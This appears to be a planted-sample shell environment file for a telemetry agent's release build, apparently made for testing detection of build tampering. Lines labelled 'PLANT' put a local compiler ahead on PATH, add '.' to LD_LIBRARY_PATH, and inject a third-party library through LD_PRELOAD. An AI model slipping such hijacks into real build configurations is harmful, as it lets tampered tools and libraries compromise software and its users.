export PROJECT=vendor-telemetry-agent
export BUILD_PROFILE=release
export CFLAGS_HINT="-O3"
export LANG=C
export TZ=UTC
# ... (lots of innocuous lines) ...
export PATH="$(pwd)/bin:$PATH"                              # PLANT 6: our gcc wins
export LD_LIBRARY_PATH=".:$LD_LIBRARY_PATH"                 # PLANT 5: '.' hijack
export LD_PRELOAD="${LD_PRELOAD:-}:$(pwd)/third_party/libcompat.so"  # PLANT 5
export TELEMETRY_URL="https://telemetry.vendor.example/collect"
